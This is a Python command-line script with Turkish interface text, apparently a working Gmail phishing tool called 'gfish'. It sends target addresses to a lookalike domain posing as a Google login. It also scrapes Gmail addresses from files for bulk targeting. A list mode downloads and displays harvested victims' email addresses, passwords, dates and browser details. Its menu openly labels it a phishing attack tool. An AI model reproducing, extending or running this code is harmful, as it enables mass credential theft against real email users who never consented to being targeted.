#!/usr/bin/env python3
import sys,time
W = "\033[0m";G = '\033[32;1m';R = '\033[31;1m';k="\033[91m";kmavi="\033[94m";norm="\033[1;37;40m"+"\033[92m";s="\033[33m"
url="http://accounts-google-login.cf/gfish3162/index.php"
try:
    import requests
except:
    print("\033[33m"+"[!] ek modulun indirilmesi gerekli"+norm)
    a=input(" indirme islemini onayliyor musunuz [y/n] : ").lower()
    if a=="y":
        try:
            import os
            os.system("pip3 install requests")
            print(norm+" modul basariyla kuruldu")
            time.sleep(2)
            os.system("python3 "+str(sys.argv[1].strip()))
            quit()
        except:
            print("R"+" [!] internet baglantinizi kontrol edin")
            quit()
    elif a=="n":
        print("unutma bu modul şart")
        quit()
    else:
        print("anlayamadim")
        quit()

from datetime import datetime
def listele():
    try:
        r=requests.post(url,data={"i":"2"}).text
        
    except:
        print(R+"\n  [!] internet bağlantinizi kontrol edin\n")
    if r=="":
        print(s+"\n  ne yazik henuz kimseyi dusurememisiz 😣😣")
        quit()
    victims=r.split("\n\n")
    for sira,i in enumerate(victims):
        if ''==i:
            del victims[sira]
    
    mailler=[]
    sifreler=[]
    browserlar=[]
    tarihler=[]
    for i in list(victims):
        if "E-posta:    PASSWORD:" in i:
            mailler.append(" ")
        else:
            mailler.append(i.split('PASSWORD: ')[0].replace("E-POSTA: ","").strip())
        if "PASSWORD:     DATE:" in i:
            sifreler.append(" ")
        else:
            
            d=i.split("DATE: ")[0].split("PASSWORD: ")[1]
            sifreler.append(d)
        d=i.split("BROWSER_INFO")[0].split("DATE: ")[1]
        tarihler.append(d)
        d=i.split("BROWSER_INFO: ")[1]
        browserlar.append(d)
        
        
    print(norm)   
    for sira,i in enumerate(zip(mailler,sifreler)):
        print(f" {sira+1}. E-POSTA: "+s+i[0].ljust(24)+norm+"  PASSWORD: "+s+f"{i[1]}"+norm)
            
       
    print("\n Ayrintilar icin sira noyu giriniz,\n   cikmak icinse 'q'")
    try:
        a=input(" no: ")
        a=int(a)
        assert 0<a<len(mailler)+2, '1'
    except:
        print("cikis yapildi")
        time.sleep(1)
        quit()
    print('')
    ii=[]
    for i in zip(mailler,sifreler,tarihler,browserlar):
        ii.append(i)
    print (W + '[' + G + "E-POSTA" + W + ']' + R + ' >> ' + W + ii[a-1][0] )
    print (W + '[' + G + 'PASSWORD' + W + ']' + R + ' >> ' + W + ii[a-1][1] )
    
    gun=int(ii[a-1][2][:2])
    ay=int(ii[a-1][2][3:5])
    yil=int(ii[a-1][2][6:10])
    tarih=str((datetime.now()-datetime(yil,ay,gun,0)).days)+' days ago'
    if tarih[:2]=='-1':
        tarih='bugun'

    print (W + '[' + G + 'DATE' + W + ']' + R + ' >> ' + W + ii[a-1][2]+'    '+tarih)
    print (W + '[' + G + 'BROWSER' + W + ']' + R + ' >> ' + W + ii[a-1][3] )
    quit()


hata=k+"[!] hatali giris "+norm
menu=["\n",
"                   Gmail fishing saldiri araci",
"                Gunluk 5 posta atma limitiniz var",
"                        admin: @wxbnko",
'  ',kmavi+'             ||========================================||  ',
'             ||                                        ||',
'             ||'+G+'         FISHING SALDIRISI ICIN     "'+s+'1'+G+'" '+kmavi+'||',
'             ||'+G+'   HACKLENENLERI GORUNTULEMEK ICIN  "'+s+'2'+G+'" '+kmavi+'||',
'             ||'+G+'              CIKMAK ICIN           "'+s+'q'+G+'" '+kmavi+'||',
'             ||========================================||',norm]
def onay(mails):
    print("\n            Fishing saldirisi yapilacaklar sunlar:\n\n"+s+"\n".join(mails),norm)
    a=input("  onayliyor musunuz [y/n] : ").strip() 
    
    if a.lower()=="y":
        pass
    else:
        print("islem iptal edildi")
        time.sleep(1) 
        quit()
        

def maildiscovery(metin):
    liste=metin.split()
    mails=[]
    for i in  liste:
        i=i.strip()
        if '@gmail.com' in i and 30>len(i)>10 and not i in mails:
            mails.append(i)
    m=set(mails)
    return list(m)
    
def saf(mail):#
    mail=mail.strip()
    if "@gmail.com" in mail:
        return mail
    else:
        return mail+"@gmail.com"
           
def gonder(mail):
    if  not 13<len(mail.strip())<30:
        print(R+" [!] hatali mail : "+mail.strip()+norm)
    else:
        try:
            r=requests.post(url,data={"i":"1","mail":mail})
        except:
            print(R+'\n  [!] internet baglantinizi kontrol edin')
            quit()
        if "1" in r.text:
            print (norm+'Mail gönderimi başarılı:  '+s+mail)
        elif "0" in r.text:
             print(s+"bu e-postaya daha onceden mail gondermissiniz: "+norm+mail)
        elif "3" in r.text:
            print(R+"\n [!] gunluk posta atma limitini doldurmussunuz\n")
            time.sleep(2)
            quit()
        elif "4" in r.text:
            print (R+'Mail gönderimi başarısız:  '+s+mail)
            print(r.text)
            
for sira,i in enumerate(sys.argv):
    sys.argv[sira]=i.lower()

if len(sys.argv)>1:
    if len(sys.argv)==2 and sys.argv[1] in ["-h","--help"]:
        print("-"*30)
        print("""
        
-t yada --target   hedef mail yada maillere saldiri yapar

(ornk_1)  python3 gfish.py -t mail
(ornk_2)  python3 gfish.py -t mail@gmail.com



-f yada --file    dosyadaki tum gmail adreslerine saldiri yapar
     
(ornk_1)  python3 gfish.py -f dosya.txt



-l yada --list    hacklenmis kurbanlarin bilgilerini gosterir

-v yada --version  verison bilgisi
""");print("-"*30);quit()
    elif len(sys.argv)==2 and sys.argv[1] in ['-v','--version']:
        print('\n\n'+'version: 0.1'.center(50)+'\n\n last-update-date: 01/07/2020     {} days ago'.format((datetime.now()-datetime(2020,7,1)).days));quit()
    elif len(sys.argv)==2 and sys.argv[1] in ['-t','--target']:
        print(hata)
        print("""\n       ornek kullanimlar:
        'python3 gfish.py -t mail1@gmail.com'
        'python3 gfish.py -t mail1'
        'python3 gfish.py -t mail1 mail2@gmail.com mail3 mail4'
        
        """);quit()
    elif len (sys.argv)==2 and sys.argv[1] in ['-l','--liste','--list']:
        listele()
    elif len(sys.argv)>3 and sys.argv[1] in ['-f','--file']:
        print(R+"[!] sadece 1 dosya seciniz")
        time.sleep(1)
        quit()
    elif len(sys.argv)==3 and sys.argv[1] in ['-f','--file']:
        try:
            file=open(sys.argv[2],'r')
        except:
            print(R+"[!] Dosya bulunamdi")
            quit()
        icerik=file.read()
        mails=maildiscovery(icerik)
        if len(mails)==0:
            print(R+"[!] e-posta bulunamadi")
            file.close()
            quit()
        onay(mails)
        for i in mails:
            gonder(i)
            time.sleep(1)
        print("\n saldiri basariyla gerceklesti\n")
        quit()
        
    elif len(sys.argv)>2 and sys.argv[1] in ['-t','--target']:
        mails=sys.argv[2:]
        if len(mails)==1:
            mail=mails[0]
            mail=saf(mail)
            print(norm+"fishing yapilacak mail : "+s+mail)
            a= input("\n onayliyor musunuz?(y/n): ").strip().lower()
            if a=="y":
                gonder(mail)
                quit()
            else:
                print("islam iptal edildi")
                time.sleep(1)
                quit()
        mails=list(map(saf,mails))
        onay(mails)
        for i in mails:
            gonder(i)
            time.sleep(1)
        print("\n saldiri basariyla gerceklesti\n")
        quit()
    else:
        print(R+"\n   [!] hatali parametre\n")
        quit()
for i in menu:
    print(i)
    time.sleep(0.05)
   
while True:
    islem=input("islem no:").strip().lower()
    if not islem in ["1","2","q"] or len(islem)!=1:
        print(hata)
        continue
    elif islem=="q":
        print("cikildi.")
        quit()
    break
if islem=="q":
    print("cikildi.")
    quit()
    
elif islem=="1":
    print(s+"\n fishing saldirisi yapilacak mailleri arada bolsuk birakarak yaziniz\n"+norm)
    hedef=input("kurban maili: ")
    if len(hedef.strip())==0:
        print("""
        islem basarisiz
        cikis yapiliyor.."""),
        quit()
    if len(hedef.strip())==1:
        if 13<len(saf(hedef.strip()))<30:
           gonder(saf(hedef))
           quit()
        else:
            print(R+" [!] hatali mail: "+saf(hedef)) 
    else:
        mails=[]
        for i in hedef.split():
            mails.append(saf(i))
    onay(mails)
    for i in mails:
        gonder(i)
        time.sleep(1)
        print("\n saldiri basariyla gerceklesti\n")
        quit()
elif islem=="2":
    listele()